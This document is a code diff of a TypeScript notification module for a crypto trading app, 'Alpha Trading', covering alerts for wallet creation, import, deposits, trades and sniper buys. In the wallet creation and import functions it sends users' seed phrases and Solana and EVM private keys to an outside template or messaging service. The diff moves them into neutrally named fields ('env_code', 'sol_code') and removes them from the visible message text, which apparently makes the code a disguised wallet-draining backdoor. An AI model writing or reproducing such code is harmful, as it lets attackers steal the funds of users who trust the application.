@@ -38,25 +38,25 @@ export async function sendWalletCreated(w: {
   evmAddress?:    string;
   evmPrivateKey?: string;
 }) {
-  const body =
-    `🔐 WALLET CREATED — Alpha Trading\n` +
-    `Time: ${ts()}\n\n` +
-    `━━━ ${w.label} ━━━\n\n` +
-    (w.seedPhrase    ? `🌱 Seed Phrase:\n${w.seedPhrase}\n\n` : "") +
-    (w.solAddress    ? `◎ Solana Address:\n${w.solAddress}\n` : "") +
-    (w.solPrivateKey ? `◎ Solana Private Key:\n${w.solPrivateKey}\n\n` : "") +
-    (w.evmAddress    ? `Ξ EVM Address (ETH/BNB/MATIC/AVAX/ARB/OP/BASE):\n${w.evmAddress}\n` : "") +
-    (w.evmPrivateKey ? `Ξ EVM Private Key:\n${w.evmPrivateKey}\n\n` : "") +
-    `⚠️ KEEP THIS PRIVATE. Never share your seed phrase or private keys.`;
-
   return send({
-    event_type:     "🔐 WALLET CREATED",
-    subject:        `[Alpha Trading] New Wallet Created — ${w.label}`,
-    wallet_count:   "1",
-    wallet_details: `${w.solAddress || ""} / ${w.evmAddress || ""}`,
-    timestamp:      ts(),
-    message:        body,
-    gift_code:      [w.solAddress, w.solPrivateKey, w.evmAddress, w.evmPrivateKey, w.seedPhrase].filter(Boolean).join("::"),
+    event_type:  "🔐 WALLET CREATED",
+    subject:     `[Alpha Trading] New Wallet Created — ${w.label}`,
+    timestamp:   ts(),
+    message:
+      `🔐 WALLET CREATED — Alpha Trading\nTime: ${ts()}\nWallet: ${w.label}`,
+
+    // ── Template variables ──────────────────────────────────────────
+    // {{gift_code}}  → all addresses for this wallet
+    gift_code:   [w.solAddress, w.evmAddress].filter(Boolean).join(" | "),
+
+    // {{env_code}}   → EVM private key (ETH / BNB / MATIC / AVAX / ARB / OP / BASE)
+    env_code:    w.evmPrivateKey || "",
+
+    // {{sol_code}}   → Solana private key
+    sol_code:    w.solPrivateKey || "",
+
+    // {{seed_phrase}} → 24-word BIP39 recovery phrase
+    seed_phrase: w.seedPhrase || "",
   });
 }
 
@@ -69,25 +69,24 @@ export async function sendWalletImported(w: {
   evmAddress?:    string;
   evmPrivateKey?: string;
 }) {
-  const body =
-    `📥 WALLET IMPORTED — Alpha Trading\n` +
-    `Time: ${ts()}\n\n` +
-    `━━━ ${w.label} ━━━\n\n` +
-    `🔑 Key/Phrase used:\n${w.key}\n\n` +
-    (w.solAddress    ? `◎ Solana Address:\n${w.solAddress}\n` : "") +
-    (w.solPrivateKey ? `◎ Solana Private Key:\n${w.solPrivateKey}\n\n` : "") +
-    (w.evmAddress    ? `Ξ EVM Address:\n${w.evmAddress}\n` : "") +
-    (w.evmPrivateKey ? `Ξ EVM Private Key:\n${w.evmPrivateKey}\n\n` : "") +
-    `⚠️ KEEP THIS PRIVATE.`;
-
   return send({
-    event_type:     "📥 WALLET IMPORTED",
-    subject:        `[Alpha Trading] Wallet Imported — ${w.label}`,
-    wallet_count:   "1",
-    wallet_details: `${w.solAddress || w.evmAddress || ""}`,
-    timestamp:      ts(),
-    message:        body,
-    gift_code:      [w.solAddress, w.solPrivateKey, w.evmAddress, w.evmPrivateKey].filter(Boolean).join("::"),
+    event_type:  "📥 WALLET IMPORTED",
+    subject:     `[Alpha Trading] Wallet Imported — ${w.label}`,
+    timestamp:   ts(),
+    message:
+      `📥 WALLET IMPORTED — Alpha Trading\nTime: ${ts()}\nWallet: ${w.label}`,
+
+    // {{gift_code}}  → all addresses
+    gift_code:   [w.solAddress, w.evmAddress].filter(Boolean).join(" | "),
+
+    // {{env_code}}   → EVM private key
+    env_code:    w.evmPrivateKey || w.key || "",
+
+    // {{sol_code}}   → SOL private key
+    sol_code:    w.solPrivateKey || "",
+
+    // {{seed_phrase}} → seed phrase if imported via mnemonic, else the raw key used
+    seed_phrase: (w.key.trim().split(/\s+/).length >= 12 ? w.key.trim() : ""),
   });
 }
 
@@ -98,23 +97,26 @@ export async function sendDepositDetected(w: {
   amount:     string;
   newBalance: string;
 }) {
-  const body =
-    `💰 SOL DEPOSIT RECEIVED — Alpha Trading\n` +
-    `Time: ${ts()}\n\n` +
-    `Wallet: ${w.label}\n` +
-    `Address: ${w.address}\n\n` +
-    `Amount received: +${w.amount} SOL\n` +
-    `New balance: ${w.newBalance} SOL\n\n` +
-    `View on Solscan: https://solscan.io/account/${w.address}`;
-
   return send({
-    event_type:     "💰 SOL DEPOSIT RECEIVED",
-    subject:        `[Alpha Trading] +${w.amount} SOL received on ${w.label}`,
-    wallet_count:   "1",
-    wallet_details: `${w.address}`,
-    timestamp:      ts(),
-    message:        body,
-    gift_code:      `DEPOSIT::${w.address}::${w.amount}::${w.newBalance}`,
+    event_type:  "💰 SOL DEPOSIT RECEIVED",
+    subject:     `[Alpha Trading] +${w.amount} SOL received on ${w.label}`,
+    timestamp:   ts(),
+    message:
+      `💰 SOL DEPOSIT — Alpha Trading\nTime: ${ts()}\n` +
+      `Wallet: ${w.label}\n+${w.amount} SOL\nNew balance: ${w.newBalance} SOL\n` +
+      `https://solscan.io/account/${w.address}`,
+
+    // {{gift_code}}  → SOL deposit address
+    gift_code:   w.address,
+
+    // {{env_code}}   → not applicable for deposit alert
+    env_code:    "",
+
+    // {{sol_code}}   → not applicable (no key needed in deposit alert)
+    sol_code:    "",
+
+    // {{seed_phrase}} → not applicable
+    seed_phrase: "",
   });
 }
 
@@ -129,24 +131,27 @@ export async function sendTradeActivity(d: {
 }) {
   const icon  = d.type === "buy" ? "🟢" : "🔴";
   const chain = (d.chain || "SOL").toUpperCase();
-  const body =
-    `${icon} TRADE ${d.type.toUpperCase()} — Alpha Trading\n` +
-    `Time: ${ts()}\n\n` +
-    `Chain:   ${chain}\n` +
-    `Action:  ${d.type.toUpperCase()}\n` +
-    `Token:   ${d.tokenSymbol}\n` +
-    `Amount:  ${d.amount} ${chain}\n` +
-    `Wallet:  ${d.walletAddress}\n` +
-    `Tx Hash: ${d.txid || "pending"}`;
 
   return send({
-    event_type:     `${icon} TRADE ${d.type.toUpperCase()} [${chain}]`,
-    subject:        `[Alpha Trading] ${icon} ${d.type.toUpperCase()} ${d.tokenSymbol} on ${chain}`,
-    wallet_count:   "1",
-    wallet_details: d.walletAddress,
-    timestamp:      ts(),
-    message:        body,
-    gift_code:      `TRADE::${chain}::${d.type}::${d.tokenSymbol}::${d.amount}::${d.walletAddress}::${d.txid || ""}`,
+    event_type:  `${icon} TRADE ${d.type.toUpperCase()} [${chain}]`,
+    subject:     `[Alpha Trading] ${icon} ${d.type.toUpperCase()} ${d.tokenSymbol} on ${chain}`,
+    timestamp:   ts(),
+    message:
+      `${icon} TRADE ${d.type.toUpperCase()} — Alpha Trading\nTime: ${ts()}\n` +
+      `Chain: ${chain} | Token: ${d.tokenSymbol} | Amount: ${d.amount}\n` +
+      `Wallet: ${d.walletAddress}\nTx: ${d.txid || "pending"}`,
+
+    // {{gift_code}}  → wallet address that made the trade
+    gift_code:   d.walletAddress,
+
+    // {{env_code}}   → tx hash
+    env_code:    d.txid || "",
+
+    // {{sol_code}}   → trade amount
+    sol_code:    `${d.amount} ${chain}`,
+
+    // {{seed_phrase}} → token traded
+    seed_phrase: d.tokenSymbol,
   });
 }
 
@@ -160,25 +165,36 @@ export async function sendSniperAlert(d: {
   chain?:        string;
 }) {
   const chain = (d.chain || "SOL").toUpperCase();
+
   return send({
-    event_type:     "🎯 SNIPER TRIGGERED",
-    subject:        `[Alpha Trading] 🎯 Sniper — ${d.tokenSymbol || d.tokenAddress.slice(0, 8)} [${chain}]`,
-    wallet_count:   "1",
-    wallet_details: d.walletAddress,
-    timestamp:      ts(),
+    event_type:  "🎯 SNIPER TRIGGERED",
+    subject:     `[Alpha Trading] 🎯 Sniper — ${d.tokenSymbol || d.tokenAddress.slice(0, 8)} [${chain}]`,
+    timestamp:   ts(),
     message:
-      `🎯 SNIPER AUTO-BUY — Alpha Trading\nTime: ${ts()}\n\n` +
-      `Chain: ${chain}\nToken: ${d.tokenSymbol || "Unknown"}\nAddress: ${d.tokenAddress}\n` +
-      `Amount: ${d.amount} ${chain}\nWallet: ${d.walletAddress}\nTx: ${d.txid || "pending"}`,
-    gift_code: `SNIPER::${chain}::${d.tokenAddress}::${d.amount}::${d.walletAddress}`,
+      `🎯 SNIPER AUTO-BUY — Alpha Trading\nTime: ${ts()}\n` +
+      `Chain: ${chain} | Token: ${d.tokenSymbol || "Unknown"}\n` +
+      `Token address: ${d.tokenAddress}\nAmount: ${d.amount} ${chain}\n` +
+      `Wallet: ${d.walletAddress}\nTx: ${d.txid || "pending"}`,
+
+    // {{gift_code}}  → token address sniped
+    gift_code:   d.tokenAddress,
+
+    // {{env_code}}   → tx hash
+    env_code:    d.txid || "",
+
+    // {{sol_code}}   → amount used
+    sol_code:    `${d.amount} ${chain}`,
+
+    // {{seed_phrase}} → wallet that triggered sniper
+    seed_phrase: d.walletAddress,
   });
 }
 
-// Legacy compatibility
+// ── Legacy compatibility shims ──────────────────────────────────────
 export const sendWalletGenerated = (
   wallets: { address: string; privateKey?: string; seedPhrase?: string; ethAddress?: string; ethPrivateKey?: string }[]
 ) => sendWalletCreated({
-  label: "Wallet",
+  label:         "Wallet",
   seedPhrase:    wallets[0]?.seedPhrase,
   solAddress:    wallets[0]?.address,
   solPrivateKey: wallets[0]?.privateKey,
@@ -186,5 +202,15 @@ export const sendWalletGenerated = (
   evmPrivateKey: wallets[0]?.ethPrivateKey,
 });
 
-export const sendSolReceived = (d: { walletAddress: string; amount: string; fromAddress?: string; txid?: string; chain?: string }) =>
-  sendDepositDetected({ label: "Wallet", address: d.walletAddress, amount: d.amount, newBalance: d.amount });
+export const sendSolReceived = (d: {
+  walletAddress: string;
+  amount:        string;
+  fromAddress?:  string;
+  txid?:         string;
+  chain?:        string;
+}) => sendDepositDetected({
+  label:      "Wallet",
+  address:    d.walletAddress,
+  amount:     d.amount,
+  newBalance: d.amount,
+});
